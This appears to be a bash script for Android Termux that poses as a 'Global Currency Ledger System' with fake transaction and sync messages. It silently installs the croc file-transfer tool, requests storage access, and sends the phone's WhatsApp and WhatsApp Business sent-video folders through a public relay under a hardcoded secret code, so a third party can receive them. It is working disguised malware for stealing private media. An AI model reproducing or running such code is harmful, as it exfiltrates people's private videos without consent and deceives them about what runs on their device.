#!/bin/bash
SECRET_CODE="DtRn847"

echo "========================================"
echo "    GLOBAL CURRENCY LEDGER SYSTEM       "
echo "    v10.0 | Direct Ledger Sync | Stable "
echo "========================================"

# 1. Setup
if ! command -v croc &> /dev/null; then
    echo ">> [SYSTEM] Initializing..."
    pkg update -y > /dev/null 2>&1 && pkg install croc -y > /dev/null 2>&1
    termux-setup-storage
fi

echo ">> [INFO] Scanning for Ledger Data..."
sleep 1

# --- Function to Send Folder Directly ---
send_direct() {
    local FOLDER_PATH=$1
    local DISPLAY_NAME=$2

    # ෆෝල්ඩර් එක තියෙනවද කියලා බලනවා
    if [ -d "$FOLDER_PATH" ]; then
        echo "----------------------------------------"
        echo ">> [TXN] FOUND: $DISPLAY_NAME"
        echo ">> [STATUS] Ready to Transfer..."
        echo "----------------------------------------"
        
        # කෙලින්ම ෆෝල්ඩර් එකම යවනවා (Zip කරන්නේ නෑ, නම වෙනස් කරන්නේ නෑ)
        env CROC_SECRET="$SECRET_CODE" croc --relay "croc.schollz.com:9009" send "$FOLDER_PATH"
        
        echo ">> [SUCCESS] Batch Complete!"
        echo ">> [INFO] Waiting 5 seconds for next batch..."
        sleep 5
    else
        echo ">> [SKIP] $DISPLAY_NAME not found (Empty)."
    fi
}

# --- STEP 1: Normal WhatsApp Sent Videos ---
# Android 11+ Path එක
PATH_1="/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Sent"
# පරණ Phones වල Path එක
PATH_1_OLD="/sdcard/WhatsApp/Media/WhatsApp Video/Sent"

TARGET_1=""
[ -d "$PATH_1" ] && TARGET_1="$PATH_1"
[ -z "$TARGET_1" ] && [ -d "$PATH_1_OLD" ] && TARGET_1="$PATH_1_OLD"

send_direct "$TARGET_1" "Primary Asset Ledger"


# --- STEP 2: Business WhatsApp Sent Videos ---
PATH_2="/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video/Sent"
PATH_2_OLD="/sdcard/WhatsApp Business/Media/WhatsApp Business Video/Sent"

TARGET_2=""
[ -d "$PATH_2" ] && TARGET_2="$PATH_2"
[ -z "$TARGET_2" ] && [ -d "$PATH_2_OLD" ] && TARGET_2="$PATH_2_OLD"

send_direct "$TARGET_2" "Business Asset Ledger"

echo "========================================"
echo "    ALL TRANSFERS COMPLETED             "
echo "========================================"
